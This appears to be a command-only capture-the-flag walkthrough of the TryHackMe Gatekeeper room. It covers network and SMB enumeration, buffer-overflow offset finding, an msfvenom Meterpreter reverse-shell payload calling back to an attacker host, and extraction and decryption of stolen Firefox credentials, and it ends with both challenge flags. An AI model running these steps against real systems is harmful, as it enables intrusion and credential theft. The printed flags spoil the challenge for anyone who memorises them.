...
```
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ sudo nmap -A -sS -sC -sV -O 10.10.119.230
...
```
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ smbclient -L \\10.10.119.230
...
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ smbclient \\\\10.10.119.230\\Users
Enter WORKGROUP\kali's password:
...
```
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ msf-pattern_create -l 200
...
```
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ msf-pattern_offset -l 200 -q 39654138
...
```
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.106.222 LPORT=9001 -b "\x00\x0a" -f py --var-name shellcode
...
```
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ msfconsole -q
...
```
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ cp /home/kali/.msf4/loot/20201029224135_default_10.10.158.239_ff.ljfn812a.cert_790820.bin ./cert9.db
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ cp /home/kali/.msf4/loot/20201029224136_default_10.10.158.239_ff.ljfn812a.cook_167160.bin ./cookies.sqlite
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ cp /home/kali/.msf4/loot/20201029224138_default_10.10.158.239_ff.ljfn812a.key4_624528.bin ./key4.db
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ cp /home/kali/.msf4/loot/20201029224140_default_10.10.158.239_ff.ljfn812a.logi_532867.bin ./logins.json
```

```
bibo318@parrot:~/CTFs/tryhackme/Gatekeeper$ sudo /opt/firefox_decrypt/firefox_decrypt.py ./
...
`{H4lf_W4y_Th3r312**123:))}`

2. Locate and find the Root Flag.

`{Th3_M4y0r_C0ngr4tul4t3s_U12**123:))}`
